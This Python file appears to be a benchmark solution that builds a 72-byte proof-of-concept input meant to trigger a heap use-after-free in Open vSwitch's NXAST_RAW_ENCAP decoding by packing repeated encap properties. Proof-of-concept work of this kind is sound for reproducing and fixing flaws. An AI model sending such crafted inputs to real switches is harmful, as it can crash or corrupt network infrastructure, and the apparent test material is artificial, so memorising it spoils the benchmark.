import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in OVS RAW_ENCAP decoding.
        
        The vulnerability occurs in decode_NXAST_RAW_ENCAP when decode_ed_prop triggers a reallocation
        of the output ofpbuf, invalidating the 'encap' pointer which is subsequently dereferenced.
        We construct an NXAST_RAW_ENCAP action with enough properties to exceed the initial buffer size (64 bytes).
        
        Ground-truth PoC length: 72 bytes.
        """
        
        # Constants for NXAST_RAW_ENCAP
        OFPAT_VENDOR = 0xffff
        NX_VENDOR_ID = 0x00002320
        NXAST_RAW_ENCAP = 46  # Subtype for RAW_ENCAP (also known as ENCAP)
        TOTAL_LEN = 72        # Matches ground-truth length
        
        # Build the Action Header (16 bytes)
        # Format: Type(2), Length(2), Vendor(4), Subtype(2), Pad(6)
        # struct nx_action_raw_encap {
        #     ovs_be16 type;
        #     ovs_be16 len;
        #     ovs_be32 vendor;
        #     ovs_be16 subtype;
        #     uint8_t pad[6];
        # };
        header = struct.pack('!HHIH6s', 
                             OFPAT_VENDOR, 
                             TOTAL_LEN, 
                             NX_VENDOR_ID, 
                             NXAST_RAW_ENCAP, 
                             b'\x00' * 6)
        
        # Build Properties (56 bytes)
        # We need to fill the remaining 56 bytes with valid properties.
        # 56 bytes / 8 bytes per property = 7 properties.
        # This volume of data (approx 16 bytes header + 7*8 data) should exceed 
        # the default 64-byte stack buffer for ofpacts, triggering realloc.
        
        # Property: NXENCAP_PROP_ETHERTYPE (Type 1)
        # Header encoding: (Type << 5) | Len_Units
        # We use Len_Units = 1 (8 bytes)
        # Header = (1 << 5) | 1 = 0x0021
        prop_header = 0x0021
        
        # Property Body: Ethertype (2 bytes) + Padding (4 bytes)
        # Total property size: 2 (Header) + 2 (Ethertype) + 4 (Pad) = 8 bytes
        ethertype = 0x0800
        prop_body = struct.pack('!HH4s', prop_header, ethertype, b'\x00' * 4)
        
        # Construct full payload
        payload = prop_body * 7
        
        return header + payload
